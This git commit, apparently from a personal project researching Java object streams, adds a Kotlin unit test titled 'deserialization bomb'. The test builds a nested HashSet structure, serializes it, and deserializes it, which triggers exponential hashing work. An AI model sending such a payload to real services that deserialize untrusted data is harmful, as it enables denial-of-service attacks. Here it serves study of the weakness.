9d49782c853444858052d3ff0b61c5906585c745
Anton Butov <butov6101@gmail.com>
2024-02-09 00:41:08 +0300

    add bomb

--- app/src/test/java/com/butovanton/objectstreamresearch/SerialUnitTest.kt
+++ app/src/test/java/com/butovanton/objectstreamresearch/SerialUnitTest.kt
@@ -8,6 +8,7 @@ import java.io.ByteArrayOutputStream
 import java.io.ObjectInputStream
 import java.io.ObjectOutputStream
 import java.io.Serializable
+import java.util.HashSet
 
 data class SomeClass(val data: String) : Serializable
 
@@ -26,6 +27,34 @@ class SerialUnitTest {
             println(bufferedOutputStream.toString())
             println(newExample)
             close()
+        }
+    }
+
+    @Test
+    fun `deserialization bomb`() {
+        val root = HashSet<Any>()
+        var s1 = root
+        var s2 = HashSet<Any>()
+
+        (0..100).forEach {
+            val t1 = HashSet<Any>()
+            val t2 = HashSet<Any>()
+            t1.add("foo")
+            s1.add(t1)
+            s1.add(t2)
+            s2.add(t1)
+            s2.add(t2)
+            s1 = t1
+            s2 = t2
+        }
+        val bufferedOutputStream = ByteArrayOutputStream()
+        ObjectOutputStream(bufferedOutputStream).apply {
+            writeObject(root)
+            println(bufferedOutputStream.toString())
+            close()
+        }
+        ObjectInputStream(ByteArrayInputStream(bufferedOutputStream.toByteArray())).apply {
+            val newExample = readObject() as HashSet<Any>
         }
     }
 }
